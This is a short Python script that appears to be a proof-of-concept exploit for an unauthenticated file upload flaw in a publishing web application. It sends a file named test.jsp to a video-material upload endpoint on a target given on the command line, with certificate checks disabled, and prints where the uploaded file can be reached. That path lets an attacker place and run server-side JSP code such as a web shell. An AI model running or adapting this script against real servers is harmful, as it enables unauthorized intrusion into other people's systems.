import requests
import sys

def upload_file(site):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }

    multipart_form_data = {
        'Filedata': ('test.jsp', open('test.txt', 'rb')),
        'Submit': (None, 'submit')
    }

    response = requests.post(sys.argv[1]+'/publishing/publishing/material/file/video', headers=headers, files=multipart_form_data, verify=False)
    info = response.json()
    upurl = info["data"]["path"]
    print("[+]Upload_file path:", sys.argv[1]+"/publishingImg/" + upurl)
    
    
if __name__=="__main__":
    upload_file(sys.argv[1])
